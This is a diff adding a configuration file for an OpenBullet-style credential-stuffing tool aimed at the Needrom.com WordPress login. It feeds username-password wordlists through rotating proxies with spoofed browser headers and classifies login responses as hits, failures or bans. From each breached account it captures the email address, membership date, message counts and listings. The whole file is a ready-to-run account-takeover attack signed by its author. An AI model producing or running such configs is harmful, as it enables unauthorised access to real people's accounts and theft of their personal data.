@@ -1,0 +1,87 @@
+[SETTINGS]
+{
+  "Name": "Needrom.com",
+  "SuggestedBots": 30,
+  "MaxCPM": 0,
+  "LastModified": "2020-07-16T01:20:40.5659068+01:00",
+  "AdditionalInfo": "Discord : XIT07#3692",
+  "RequiredPlugins": [],
+  "Author": "XIT07",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Get_Login REQUEST GET "https://www.needrom.com/wp-login.php" 
+  
+
+#COOKIES PARSE "<COOKIES>" LR "" "" -> VAR "PHPSESSID:" 
+
+#testcookie PARSE "<SOURCE>" LR "name=\"testcookie\" value=\"" "\" />" -> VAR "testcookie" 
+
+#Form_Login REQUEST POST "https://www.needrom.com/wp-login.php" 
+  CONTENT "log=<USER>&pwd=<PASS>&login=Login+%C2%BB&redirect_to=https%3A%2F%2Fwww.needrom.com%2Fdashboard%2F&testcookie=<testcookie>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "origin: https://www.needrom.com" 
+  HEADER "referer: https://www.needrom.com/wp-login.php" 
+  HEADER "sec-fetch-dest: document" 
+  HEADER "sec-fetch-mode: navigate" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "sec-fetch-user: ?1" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "ERROR</strong>: Invalid username." 
+    KEY "is incorrect" 
+  KEYCHAIN Success OR 
+    KEY "\">Log out</a>" 
+    KEY "Account Information" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "The username field is empty" 
+  KEYCHAIN Ban OR 
+    KEY "Too many failed login attempts. Please try again in 4 minutes, if you continue of trying your ip will be blocked for 1 hour." 
+
+#Get_dashboard REQUEST GET "https://www.needrom.com/dashboard/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#EMAIL PARSE "<SOURCE>" LR "<li><div class=\"emailico\"></div><a href=\"mailto:" "\">" CreateEmpty=FALSE -> CAP "EMAIL" 
+
+#Member_Since PARSE "<SOURCE>" LR "</li><li><strong>Member Since:</strong>" "</li><li><strong>" CreateEmpty=FALSE -> CAP "Member Since" 
+
+#PM PARSE "<SOURCE>" LR "'>PM (<span style='color:white;'>" "</span>) AN" CreateEmpty=FALSE -> CAP "PM" 
+
+#AN PARSE "<SOURCE>" LR "</span>) AN (<span style='color:white;'>" "</span>)</a>" CreateEmpty=FALSE -> CAP "AN" 
+
+#Total_Listings PARSE "<SOURCE>" LR "</strong></li><li>Total Listings: <strong>" "</strong></li></ul>" CreateEmpty=FALSE -> CAP "Total Listings" 
+
+#Credit FUNCTION Constant "BY XIT07" -> CAP "CONFIG" 
+
